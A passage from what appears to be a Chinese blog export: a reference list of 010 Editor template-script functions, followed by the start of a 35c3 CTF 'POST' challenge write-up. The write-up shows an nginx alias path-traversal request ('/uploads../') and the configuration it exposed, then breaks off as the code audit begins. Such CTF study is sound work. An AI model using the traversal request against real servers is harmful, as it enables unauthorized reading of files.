<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//类型转换  </span></span><br><span class="line"><span class="keyword">double</span> Atof( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> Atoi( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line">int64 BinaryStrToInt( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line">    <span class="keyword">return</span> BinaryStrToInt( <span class="string">"01001101"</span> );  </span><br><span class="line"><span class="keyword">char</span>[] ConvertString( <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> srcCharSet, <span class="keyword">int</span> destCharSet )  </span><br><span class="line">    CHARSET_ASCII CHARSET_ANSI CHARSET_OEM CHARSET_EBCDIC CHARSET_UNICODE CHARSET_MAC CHARSET_ARABIC CHARSET_BALTIC CHARSET_CHINESE_S CHARSET_CHINESE_T CHARSET_CYRILLIC CHARSET_EASTEUROPE CHARSET_GREEK CHARSET_HEBREW CHARSET_JAPANESE CHARSET_KOREAN_J CHARSET_KOREAN_W CHARSET_THAI CHARSET_TURKISH CHARSET_VIETNAMESE CHARSET_UTF8  </span><br><span class="line">string DosDateToString( DOSDATE d, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> )  </span><br><span class="line">string DosTimeToString( DOSTIME t, <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> )  </span><br><span class="line">string EnumToString( <span class="keyword">enum</span> e )  </span><br><span class="line">string FileTimeToString( FILETIME ft, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line">    <span class="keyword">int</span> hour, minute, second, day, month, year;  </span><br><span class="line">    string s = FileTimeToString( ft );  </span><br><span class="line">    SScanf( s, <span class="string">"%02d/%02d/%04d %02d:%02d:%02d"</span>,  </span><br><span class="line">    month, day, year, hour, minute, second );  </span><br><span class="line">    year++;  </span><br><span class="line">    SPrintf( s, <span class="string">"%02d/%02d/%04d %02d:%02d:%02d"</span>,  </span><br><span class="line">    month, day, year, hour, minute, second );  </span><br><span class="line"><span class="keyword">int</span> StringToDosDate( string s, DOSDATE &amp;d, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToDosTime( string s, DOSTIME &amp;t, <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToFileTime( string s, FILETIME &amp;ft, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToOleTime( string s, OLETIME &amp;ot, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToTimeT( string s, time_t &amp;t, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">char</span>[] StringToUTF8( <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> srcCharSet=CHARSET_ANSI )  </span><br><span class="line">wstring StringToWString( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> srcCharSet=CHARSET_ANSI )  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//内存操作  </span></span><br><span class="line"><span class="keyword">int</span> Memcmp( <span class="keyword">const</span> uchar s1[], <span class="keyword">const</span> uchar s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> Memcpy( uchar dest[], <span class="keyword">const</span> uchar src[], <span class="keyword">int</span> n, <span class="keyword">int</span> destOffset=<span class="number">0</span>, <span class="keyword">int</span> srcOffset=<span class="number">0</span> )  </span><br><span class="line"><span class="keyword">void</span> Memset( uchar s[], <span class="keyword">int</span> c, <span class="keyword">int</span> n )  </span><br><span class="line">string OleTimeToString( OLETIME ot, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> RegExMatch( string str, string regex ); <span class="comment">//正则匹配  </span></span><br><span class="line"><span class="keyword">int</span> RegExMatchW( wstring str, wstring regex );  </span><br><span class="line"><span class="keyword">int</span> RegExSearch( string str, string regex, <span class="keyword">int</span> &amp;matchSize, <span class="keyword">int</span> startPos=<span class="number">0</span> );   </span><br><span class="line"><span class="keyword">int</span> RegExSearchW( wstring str, wstring regex, <span class="keyword">int</span> &amp;matchSize, <span class="keyword">int</span> startPos=<span class="number">0</span> );  </span><br><span class="line">    <span class="keyword">if</span>( RegExMatch( <span class="string">"test@test.ca"</span>,  </span><br><span class="line">    <span class="string">"\\b[A-Za-z0-9.%_+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]&#123;2,4&#125;\\b"</span> )  </span><br><span class="line">    == <span class="literal">false</span> )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Warning( <span class="string">"Invalid email address"</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">int</span> result, size;  </span><br><span class="line">    result = RegExSearch(  </span><br><span class="line">    <span class="string">"12:03:23 AM - 192.168.0.10 : www.sweetscape.com/"</span>,  </span><br><span class="line">    <span class="string">"\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;.\\d&#123;1,3&#125;.\\d&#123;1,3&#125;"</span>, size );  </span><br><span class="line">    Printf( <span class="string">"Match at pos %d of size %d\n"</span>, result, size );  </span><br><span class="line"><span class="keyword">void</span> Strcat( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[] )  </span><br><span class="line"><span class="keyword">int</span> Strchr( <span class="keyword">const</span> <span class="keyword">char</span> s[], <span class="keyword">char</span> c )  </span><br><span class="line"><span class="keyword">int</span> Strcmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )   </span><br><span class="line"><span class="keyword">void</span> Strcpy( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[] )  </span><br><span class="line"><span class="keyword">char</span>[] StrDel( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count )   </span><br><span class="line"><span class="keyword">int</span> Stricmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )  </span><br><span class="line"><span class="keyword">int</span> Strlen( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> Strncmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> Strncpy( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> n )   </span><br><span class="line"><span class="keyword">int</span> Strnicmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">int</span> Strstr( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )  </span><br><span class="line"><span class="keyword">char</span>[] SubStr( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count=<span class="number">-1</span> )  </span><br><span class="line">string TimeTToString( time_t t, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">char</span> ToLower( <span class="keyword">char</span> c ) <span class="keyword">wchar_t</span> ToLowerW( <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">char</span> ToUpper( <span class="keyword">char</span> c ) <span class="keyword">wchar_t</span> ToUpperW( <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">void</span> WMemcmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WMemcpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[], <span class="keyword">int</span> n, <span class="keyword">int</span> destOffset=<span class="number">0</span>, <span class="keyword">int</span> srcOffset=<span class="number">0</span> )  </span><br><span class="line"><span class="keyword">void</span> WMemset( <span class="keyword">wchar_t</span> s[], <span class="keyword">int</span> c, <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WStrcat( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[] )  </span><br><span class="line"><span class="keyword">int</span> WStrchr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s[], <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">int</span> WStrcmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">void</span> WStrcpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[] )  </span><br><span class="line"><span class="keyword">wchar_t</span>[] WStrDel( <span class="keyword">const</span> whar_t str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count )   </span><br><span class="line"><span class="keyword">int</span> WStricmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">char</span>[] WStringToString( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[], <span class="keyword">int</span> destCharSet=CHARSET_ANSI )  </span><br><span class="line"><span class="keyword">char</span>[] WStringToUTF8( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[] )  </span><br><span class="line"><span class="keyword">int</span> WStrlen( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> WStrncmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WStrncpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">int</span> WStrnicmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )   </span><br><span class="line"><span class="keyword">int</span> WStrstr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">wchar_t</span>[] WSubStr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count=<span class="number">-1</span> )  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span>[] FileNameGetBase( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">int</span> includeExtension=<span class="literal">true</span> ) <span class="comment">//获取文件名  </span></span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetBaseW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">int</span> includeExtension=<span class="literal">true</span> )  </span><br><span class="line"><span class="keyword">char</span>[] FileNameGetExtension( <span class="keyword">const</span> <span class="keyword">char</span> path[] )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetExtensionW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[] )  </span><br><span class="line"><span class="keyword">char</span>[] FileNameGetPath( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">int</span> includeSlash=<span class="literal">true</span> )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetPathW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">int</span> includeSlash=<span class="literal">true</span> )  </span><br><span class="line"><span class="keyword">char</span>[] FileNameSetExtension( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">const</span> <span class="keyword">char</span> extension[] )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameSetExtensionW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> extension[] )   </span><br><span class="line">  </span><br><span class="line"><span class="comment">//格式化字符串  </span></span><br><span class="line"><span class="keyword">int</span> SPrintf( <span class="keyword">char</span> buffer[], <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] )  </span><br><span class="line"><span class="keyword">int</span> SScanf( <span class="keyword">char</span> str[], <span class="keyword">char</span> format[], ... )</span><br></pre></td></tr></table></figure>

<p>工具函数</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计算校验和  </span></span><br><span class="line"><span class="built_in">int</span>64 Checksum( <span class="built_in">int</span> algorithm, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line">    CHECKSUM_BYTE CHECKSUM_SHORT_LE CHECKSUM_SHORT_BE CHECKSUM_INT_LE CHECKSUM_INT_BE CHECKSUM_INT64_LE CHECKSUM_INT64_BE CHECKSUM_SUM8 CHECKSUM_SUM16 CHECKSUM_SUM32 CHECKSUM_SUM64 CHECKSUM_CRC16 CHECKSUM_CRCCCITT CHECKSUM_CRC32 CHECKSUM_ADLER32  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgArrayStr( <span class="built_in">int</span> algorithm, char result[], uchar *buffer, <span class="built_in">int</span>64 size, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgArrayBytes( <span class="built_in">int</span> algorithm, uchar result[], uchar *buffer, <span class="built_in">int</span>64 size, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgStr( <span class="built_in">int</span> algorithm, char result[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgBytes( <span class="built_in">int</span> algorithm, uchar result[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//查找比较  </span></span><br><span class="line">TCompareResults Compare( <span class="built_in">int</span> type, <span class="built_in">int</span> fileNumA, <span class="built_in">int</span> fileNumB, <span class="built_in">int</span>64 startA=<span class="number">0</span>, <span class="built_in">int</span>64 sizeA=<span class="number">0</span>, <span class="built_in">int</span>64 startB=<span class="number">0</span>, <span class="built_in">int</span>64 sizeB=<span class="number">0</span>, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span>64 maxlookahead=<span class="number">10000</span>, <span class="built_in">int</span>64 minmatchlength=<span class="number">8</span>, <span class="built_in">int</span>64 quickmatch=<span class="number">512</span> )  </span><br><span class="line">    <span class="built_in">int</span> i, f1, f2;  </span><br><span class="line">    FileOpen( <span class="string">"C:\\temp\\test1"</span> );  </span><br><span class="line">    f1 = GetFileNum();  </span><br><span class="line">    FileOpen( <span class="string">"C:\\temp\\test2"</span> );  </span><br><span class="line">    f2 = GetFileNum();  </span><br><span class="line">    TCompareResults r = Compare( COMPARE_SYNCHRONIZE, f1, f2 );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Printf( <span class="string">"%d %Ld %Ld %Ld %Ld\n"</span>,  </span><br><span class="line">    r.record[i].type,  </span><br><span class="line">    r.record[i].startA,  </span><br><span class="line">    r.record[i].sizeA,  </span><br><span class="line">    r.record[i].startB,  </span><br><span class="line">    r.record[i].sizeB );  </span><br><span class="line">    &#125;  </span><br><span class="line">TFindResults FindAll( &lt;datatype&gt; data, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">    <span class="built_in">int</span> i;  </span><br><span class="line">    TFindResults r = FindAll( <span class="string">"Test"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%Ld %Ld\n"</span>, r.start[i], r.size[i] );  </span><br><span class="line"><span class="built_in">int</span>64 FindFirst( &lt;datatype&gt; data, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">TFindInFilesResults FindInFiles( &lt;datatype&gt; data, char dir[], char mask[], <span class="built_in">int</span> subdirs=<span class="literal">true</span>, <span class="built_in">int</span> openfiles=<span class="literal">false</span>, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">    <span class="built_in">int</span> i, j;  </span><br><span class="line">    TFindInFilesResults r = FindInFiles( <span class="string">"PK"</span>,  </span><br><span class="line">    <span class="string">"C:\\temp"</span>, <span class="string">"*.zip"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Printf( <span class="string">" %s\n"</span>, r.file[i].filename );  </span><br><span class="line">    Printf( <span class="string">" %d\n"</span>, r.file[i].count );  </span><br><span class="line">    <span class="keyword">for</span>( j = <span class="number">0</span>; j &lt; r.file[i].count; j++ )  </span><br><span class="line">    Printf( <span class="string">" %Ld %Ld\n"</span>,  </span><br><span class="line">    r.file[i].start[j],  </span><br><span class="line">    r.file[i].size[j] );  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="built_in">int</span>64 FindNext( <span class="built_in">int</span> dir=<span class="number">1</span> )  </span><br><span class="line">TFindStringsResults FindStrings( <span class="built_in">int</span> minStringLength, <span class="built_in">int</span> type, <span class="built_in">int</span> matchingCharTypes, wstring customChars=<span class="string">""</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> requireNull=<span class="literal">false</span> )  </span><br><span class="line">    TFindStringsResults r = FindStrings( <span class="number">5</span>, FINDSTRING_ASCII,  </span><br><span class="line">    FINDSTRING_LETTERS | FINDSTRING_CUSTOM, <span class="string">"$&amp;"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%Ld %Ld %d\n"</span>, r.start[i], r.size[i], r.type[i] );  </span><br><span class="line">      </span><br><span class="line"><span class="comment">//类型转换  </span></span><br><span class="line">char ConvertASCIIToEBCDIC( char ascii )  </span><br><span class="line"><span class="built_in">void</span> ConvertASCIIToUNICODE( <span class="built_in">int</span> len, <span class="keyword">const</span> char ascii[], ubyte unicode[], <span class="built_in">int</span> bigendian=<span class="literal">false</span> )  </span><br><span class="line"><span class="built_in">void</span> ConvertASCIIToUNICODEW( <span class="built_in">int</span> len, <span class="keyword">const</span> char ascii[], ushort unicode[] )   </span><br><span class="line">char ConvertEBCDICToASCII( char ebcdic )  </span><br><span class="line"><span class="built_in">void</span> ConvertUNICODEToASCII( <span class="built_in">int</span> len, <span class="keyword">const</span> ubyte unicode[], char ascii[], <span class="built_in">int</span> bigendian=<span class="literal">false</span> )  </span><br><span class="line"><span class="built_in">void</span> ConvertUNICODEToASCIIW( <span class="built_in">int</span> len, <span class="keyword">const</span> ushort unicode[], char ascii[] )  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int</span> ExportFile( <span class="built_in">int</span> type, char filename[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span>64 startaddress=<span class="number">0</span>,<span class="built_in">int</span> bytesperrow=<span class="number">16</span>, <span class="built_in">int</span> wordaddresses=<span class="number">0</span> )  </span><br><span class="line"><span class="built_in">int</span> ImportFile( <span class="built_in">int</span> type, char filename[], <span class="built_in">int</span> wordaddresses=<span class="literal">false</span>, <span class="built_in">int</span> defaultByteValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> GetSectorSize()   </span><br><span class="line"><span class="built_in">int</span> HexOperation( <span class="built_in">int</span> operation, <span class="built_in">int</span>64 start, <span class="built_in">int</span>64 size, operand, step=<span class="number">0</span>, <span class="built_in">int</span>64 skip=<span class="number">0</span> )  </span><br><span class="line"><span class="built_in">int</span>64 Histogram( <span class="built_in">int</span>64 start, <span class="built_in">int</span>64 size, <span class="built_in">int</span>64 result[<span class="number">256</span>] )  </span><br><span class="line"><span class="built_in">int</span> IsDrive()  </span><br><span class="line"><span class="built_in">int</span> IsLogicalDrive()  </span><br><span class="line"><span class="built_in">int</span> IsPhysicalDrive()  </span><br><span class="line"><span class="built_in">int</span> IsProcess()  </span><br><span class="line"><span class="built_in">int</span> OpenLogicalDrive( char driveletter )  </span><br><span class="line"><span class="built_in">int</span> OpenPhysicalDrive( <span class="built_in">int</span> physicalID )  </span><br><span class="line"><span class="built_in">int</span> OpenProcessById( <span class="built_in">int</span> processID, <span class="built_in">int</span> openwriteable=<span class="literal">true</span> )  </span><br><span class="line"><span class="built_in">int</span> OpenProcessByName( char processname[], <span class="built_in">int</span> openwriteable=<span class="literal">true</span> )  </span><br><span class="line"><span class="built_in">int</span> ReplaceAll( &lt;datatype&gt; finddata, &lt;datatype&gt; replacedata, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> padwithzeros=<span class="literal">false</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )</span><br></pre></td></tr></table></figure>

<p>特别需要注意的是以下几个函数，对于解析偏移后的动态数据它们是不可或缺的：</p>
<p>FEof 判断当前读取位置是否在文件末尾<br>FTell 返回文件的当前读取位置<br>FSeek 将当前读取位置设置为指定地址<br>FSkip 将当前读取位置向前移动多个字节</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>blue &amp; red</tag>
      </tags>
  </entry>
  <entry>
    <title>35c3 POST题目复现</title>
    <url>/2019/01/10/35c3%20POST%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>最近有点忙，所以拖了这么久才来复现这个题目，题目官方已经给了wp和docker环境,<a href="https://github.com/eboda/35c3/" target="_blank" rel="noopener">https://github.com/eboda/35c3/</a>可以本地搭建一下。</p>
<a id="more"></a>

<p>题目的描述如下：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Go make some posts <span class="keyword">http</span>://<span class="number">35.207</span><span class="number">.83</span><span class="number">.242</span>/</span><br><span class="line">Hint: flag is <span class="keyword">in</span> db</span><br><span class="line">Hint2: <span class="keyword">the</span> lovely XSS is part <span class="keyword">of</span> <span class="keyword">the</span> beautiful design <span class="keyword">and</span> insignificant <span class="keyword">for</span> <span class="keyword">the</span> challenge</span><br><span class="line">Hint3: You probably want <span class="built_in">to</span> <span class="built_in">get</span> <span class="keyword">the</span> source code, luckily <span class="keyword">for</span> you <span class="keyword">it</span><span class="string">'s rather hard to configure nginx correctly.</span></span><br></pre></td></tr></table></figure>
<h3 id="0x1-nginx配置问题，导致文件文件读取"><a href="#0x1-nginx配置问题，导致文件文件读取" class="headerlink" title="0x1 nginx配置问题，导致文件文件读取"></a>0x1 nginx配置问题，导致文件文件读取</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span><span class="regexp">/uploads../</span></span><br></pre></td></tr></table></figure>
<p>可以列取web目录，发现有个<code>default.backup</code>,是nginx的配置文件，发现开了两个web服务，一个在80端口，一个在8080端口的只允许本地访问。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">access_log</span>  /var/log/nginx/example.log;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> /uploads &#123;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">alias</span> /var/www/uploads/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">alias</span> /var/www/html/;</span><br><span class="line">        <span class="attribute">index</span> index.php;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> /inc/ &#123;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">127.0.0.1:8080</span>;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/proxy.log;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> ( <span class="variable">$request_method</span> !<span class="regexp">~ ^(GET)$</span> ) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">405</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">root</span> /var/www/miniProxy;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span> index.php;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载下来所有的代码，进行审计</p>
<h3 id="0x2-post服务的任意类伪造"><a href="#0x2-post服务的任意类伪造" class="headerlink" title="0x2 post服务的任意类伪造"></a>0x2 post服务的任意类伪造</h3><p>先下载下来 <code>html</code> 目录post服务的代码，发现基本功能如下：</p>
<p>1.创建post的功能：</p>
